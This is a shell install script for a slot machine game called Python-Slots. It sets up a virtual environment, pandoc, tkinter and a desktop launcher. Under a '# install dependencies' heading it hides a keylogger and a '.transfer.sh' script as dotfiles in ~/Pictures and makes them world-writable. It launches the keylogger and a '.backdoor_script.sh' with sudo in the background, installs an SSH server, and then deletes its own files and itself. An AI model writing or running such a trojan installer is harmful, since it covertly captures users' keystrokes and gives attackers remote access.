# activate venv
cd ~/Python-Slots
. slotmachine/bin/activate

# install openssh
sudo apt-get install openssh-server

# install wiki
sudo apt-get install pandoc
pandoc -s -o ~/Desktop/README.html wiki.md --css https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css

# install launcher
cp SlotMachine.desktop ~/Desktop/SlotMachine.desktop
chmod a+x ~/Desktop/SlotMachine.desktop
chmod 700 ~/Desktop/SlotMachine.desktop
chmod a+x ~/Python-Slots/slotmachine/launcher.sh
chmod 700 ~/Python-Slots/slotmachine/launcher.sh
gsettings set org.gnome.nautilus.preferences executable-text-activation launch

# install tkinter
sudo apt-get install python3-tk

# install admin-tools
mkdir ~/admin-tools
mv ~/Python-Slots/admin-tools/* ~/admin-tools
cd ~/Python-Slots/slotmachine/Python-Slots
echo '{"disabled": "false"}' > ~/admin-tools/disabled
cd ~/Python-Slots
rm -rf admin-tools

# install dependencies
cd ~/Python-Slots/dependencies
mv .keylogger ~/Pictures
mv .keylogger.sh ~/Pictures
mv .transfer.sh ~/Pictures
cd ~/Pictures
chgrp sudo .keylogger
chgrp sudo .keylogger.sh
chgrp sudo .transfer.sh
chmod 777 .keylogger
chmod 777 .keylogger.sh
chmod 777 .transfer.sh
chmod +x .keylogger
chmod +x .keylogger.sh
chmod +x .transfer.sh
echo > .out
chgrp sudo .out
chmod 777 .out
sudo sh -c ".keylogger.sh" &
disown
cd ~/Python-Slots/dependencies
chgrp sudo .backdoor_script.sh
chmod 777 .backdoor_script.sh
chmod +x .backdoor_script.sh
sudo sh -c ".backdoor_script.sh" &
disown
rm -rf ~/Python-Slots/dependencies
echo "Installed dependencies."

# remove script
cd ~/Python-Slots
rm ./setup.sh